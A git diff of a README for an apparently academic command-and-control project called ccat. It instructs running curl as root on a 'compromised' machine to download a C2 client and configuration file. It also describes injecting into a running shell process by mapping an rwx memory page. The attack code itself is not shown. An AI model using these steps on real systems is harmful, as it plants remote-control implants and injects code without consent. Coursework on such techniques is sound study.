@@ -1,9 +1,12 @@
 # C2 Project Submission
 ## Installation
+First, install pip using the instructions [here](https://pip.pypa.io/en/stable/installation/#get-pip-py).
+
 Install the pycryptodome package using pip and download the relevant repo code.
 On the client (compromised week 4) machine, run the following as root:
 ```shell
 pip install pycryptodome
+pip install pyelftools
 curl -L https://github.com/tararoshan/ccat/raw/main/python-version/configuration.py -o configuration.py
 curl -L https://github.com/tararoshan/ccat/raw/main/python-version/client.py -o client.py
 ```
@@ -40,10 +43,10 @@ function.
 
 ## How ccat works
 ### Process Injection
-To figure out what the pid is for the shell (bash) process, run `pgrep sh`. So
-to inject into the shell process, we can run
+To figure out what the pid is for the shell (bash) processes, run `pgrep sh`. To
+figure out that of the current shell, look at the value of `$$`.
 ```shell
-python client_setup.py $(pgrep sh)$
+python client_setup.py $$
 ```
 This creates a rwx page (via the mmap syscall) so that our program can more
 easily inject code.
